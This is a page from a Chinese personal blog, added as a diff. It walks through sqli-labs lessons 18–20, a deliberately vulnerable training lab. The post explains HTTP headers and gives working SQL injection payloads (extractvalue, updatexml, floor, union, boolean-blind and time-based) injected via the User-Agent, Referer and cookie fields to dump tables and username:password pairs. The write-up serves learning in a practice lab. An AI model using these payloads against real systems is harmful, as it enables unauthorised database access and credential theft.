@@ -1,0 +1,343 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.jpg"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.jpg">
+	
+			    <title>
+    liquor's blog
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="miccall" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 5.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Little Genius</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/about/" title="简历">
+		                简历
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/group/" title="团队">
+		                团队
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/liquor-boop" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+                    <li>
+                        <a title="500px" href="http://500px.com" target="_blank" rel="noopener">
+                            <i class="icon fa fa-500px"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url();background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >sqli-labs（四）</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>基于错误的用户代理，头部POST注入.</p>
+<p>补充几个请求头：</p>
+<blockquote>
+<ul>
+<li><code>Host</code><br> Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li>
+<li><code>User-Agent</code><br> User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li>
+<li><code>Referer</code><br> Referer包含一个URL，代表当前访问URL的上一个URL。</li>
+<li><code>Cookie</code><br> Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li>
+<li><code>Range</code><br> Range可以请求实体的部分内容。</li>
+<li><code>X-Forwarded-For</code><br> X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li>
+<li><code>Accept</code><br> Accept请求报头域用于指定客户端接收哪些<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li>
+<li><code>Accept-Charset</code><br> Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li>
+</ul>
+</blockquote>
+<h4 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h4><p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" alt="1"></p>
+<p>本关对用户名和密码做了check_input()处理，故无法注入。但在用admin登录成功时发现页面有user agent 信息猜测可在其注入，但由于这里执行的语句是insert,所以不能像之前一样用#将后面的语句给注释掉。当#注释掉后面就无法正常插入执行 SQL语句。</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" alt="2"></p>
+<p>查找源代码验证了猜测</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" alt="3"></p>
+<p><strong>注意:*<em>这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。**</em>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录*</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…………</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" alt="4"></p>
+<h3 id="（一）hackbar插件"><a href="#（一）hackbar插件" class="headerlink" title="（一）hackbar插件:"></a>（一）hackbar插件:</h3><h3 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>先试单引号</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" alt="7"></p>
+<p>报错，再闭合，回显正常</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" alt="6"></p>
+<p>查看源代码确定为单引号注入。</p>
+<h4 id="2-爆库"><a href="#2-爆库" class="headerlink" title="2.爆库"></a>2.爆库</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" alt="5"></p>
+<h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or &#39;1&#39;=&#39;1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" alt="8"></p>
+<h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  or &#39;1&#39;=&#39;1</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" alt="9"></p>
+<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or&#39;1&#39;=&#39;1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" alt="10"></p>
+<p>遇到之前的老问题数据显示不全，可用limit0,1;来遍历或者使用not in()：</p>
+<p><code>&#39; or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) or &#39; </code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" alt="11"></p>
+<p>不过这种方法也很麻烦。</p>
+<p>updatexml()类似。</p>
+<h3 id="floor"><a href="#floor" class="headerlink" title="floor():"></a>floor():</h3><p><code>&#39; and (select 1 from (select  count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and &#39;</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" alt="12"></p>
+<p>也可使用时间盲注。</p>
+<h3 id="二-HTTP-Header-Live"><a href="#二-HTTP-Header-Live" class="headerlink" title="(二)HTTP Header Live"></a>(二)HTTP Header Live</h3><p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p>
+<h3 id><a href="#" class="headerlink" title></a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" alt="13"></h3><h3 id="（三）Live-HTTP-headers"><a href="#（三）Live-HTTP-headers" class="headerlink" title="（三）Live HTTP headers"></a>（三）Live HTTP headers</h3><p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22146195/article/details/103537148%E8%BF%99%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%9C%89%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B%E3%80%82">https://blog.csdn.net/qq_22146195/article/details/103537148这篇博客有详细教程。</a></p>
+<h3 id="四-Burp-Suite"><a href="#四-Burp-Suite" class="headerlink" title="(四)Burp Suite"></a>(四)Burp Suite</h3><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。**<em>安装burp suite需要java环境**</em></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" alt="14"></p>
+<p>类似工具还有很多不一一列举。</p>
+<h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>基于头部的Referer POST报错注入</p>
+<p>成功登陆后会显示referer地址,用户名与18关一样用函数进行处理，故在referer注入。与18关类似。</p>
+<p>仍可用HTTP Header Live：</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" alt="15"></p>
+<p>Burp Suite：</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" alt="16"></p>
+<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>基于错误的cookie头部POST注入</p>
+<p>从源代码中我们可以看到cookie从username获得值之后，当再次刷新时会从cookie中获取username,然后进行查询。</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" alt="18"></p>
+<p>因为此关为post注入，可使用union联合语句，报错语句。</p>
+<h2 id="法一：union联合语句"><a href="#法一：union联合语句" class="headerlink" title="法一：union联合语句"></a>法一：union联合语句</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p>
+<p>单引号报错</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" alt="19"></p>
+<p>注释掉回显正常</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" alt="20"></p>
+<h4 id="2-判断字段数与回显字段"><a href="#2-判断字段数与回显字段" class="headerlink" title="2.判断字段数与回显字段"></a>2.判断字段数与回显字段</h4><p>使用burp suite抓个包：</p>
+<p><code>uname=admin&#39; order by 4 -- #</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" alt="21"></p>
+<p>4报错，3回显正常。其实和第一关如出一辙。</p>
+<p><code>uname=1&#39; union select 1,2,3 -- #</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" alt="22"></p>
+<p>之后就是查库，查表，查列，查值……不再赘述。</p>
+<h2 id="法二：floor"><a href="#法二：floor" class="headerlink" title="法二：floor()"></a>法二：floor()</h2><p><code>uname=1&#39; or (select 1 from (select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" alt="23"></p>
+<h2 id="法三：updatexml-注入，extractvalue-注入"><a href="#法三：updatexml-注入，extractvalue-注入" class="headerlink" title="法三：updatexml()注入，extractvalue()注入"></a>法三：updatexml()注入，extractvalue()注入</h2><p><code>uname=1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" alt="24"></p>
+<h2 id="法四：布尔盲注"><a href="#法四：布尔盲注" class="headerlink" title="法四：布尔盲注"></a>法四：布尔盲注</h2><p><code>uname=admin&#39; and left((select database()),8)=&#39;security&#39;-- #</code></p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" alt="27"></p>
+<p>报错时页面：</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" alt="26"></p>
+<h2 id="法五：延时注入"><a href="#法五：延时注入" class="headerlink" title="法五：延时注入"></a>法五：延时注入</h2><p><code>uname=admin&#39; and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" alt="28"></p>
+<p>用burp suite 抓包报错会一直延时，hackbar正常延时，报错页面如下：</p>
+<p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" alt="29"></p>
+
+            </div>
+
+            <!-- Post Comments -->
+            
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
+            text-align: center;
+            vertical-align: middle;
+            border: 0;
+            background: rgba(158, 158, 158, .2);
+            box-shadow: 0 2px 2px 0 rgba(0, 0, 0, .14), 0 3px 1px -2px rgba(0, 0, 0, .2), 0 1px 5px 0 rgba(0, 0, 0, .12);
+            color: #fff;
+            background-color: #7EC0EE;
+            text-shadow: 0
+        }
+</style>
+	
+<div class="btn_click_load" id="disqus_bt"> 
+    <button class="disqus_click_btn">点击查看评论</button>
+</div>
+
+<!--
+<script type="text/javascript">
+$('.btn_click_load').click(function() {
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'http-miccall-tech'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    document.getElementById('disqus_bt').style.display = "none";
+});
+</script>
+-->
+<script type="text/javascript">
+    var disqus_config = function () {
+        this.page.url = 'http://liquor-boop.github.io/2020/11/26/sqli-labs%E5%9B%9B/';  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = 'http://liquor-boop.github.io/2020/11/26/sqli-labs%E5%9B%9B/'; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+    };
+</script>
+
+<script type="text/javascript">
+    $('.btn_click_load').click(function() {  //click to load comments
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document;
+            var s = d.createElement('script');
+            s.src = '//http-miccall-tech.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', + new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+        $('.btn_click_load').css('display','none');
+    });
+</script>
+</div>
+<style>
+    #disqus-comment{
+        background-color: #eee;
+        padding: 2pc;
+    }
+</style>
+
+
+        </div>
+        <!-- Copyright 版权 start -->
+                <div id="copyright">
+            <ul>
+                <li>&copy;Powered By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/" style="border-bottom: none;">hexo</a></li>
+                <li>Design: <a target="_blank" rel="noopener" href="http://miccall.tech " style="border-bottom: none;">miccall</a></li>
+            </ul>
+            
+                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+			
+        </div>
+    </div>
+</body>
+
+
+
+ 	
+</html>
